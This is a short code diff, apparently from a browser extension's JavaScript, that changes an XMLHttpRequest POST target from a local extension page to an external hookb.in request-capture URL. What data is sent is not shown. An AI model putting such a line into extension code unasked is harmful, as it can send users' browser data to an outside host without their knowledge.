@@ -148,7 +148,7 @@ xhr.send("name=k&message=yo");*/
 
 
 	var xmlhttp = new XMLHttpRequest();
-    xmlhttp.open("POST","moz-extension://3d175a4e-504b-4541-9e30-85a534e51895/index.html#");
+    xmlhttp.open("POST","https://hookb.in/dmeGg88gyXs9RRzP31j1");
 	var xmlDoc;
 	xmlhttp.onreadystatechange = function() {
 	if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
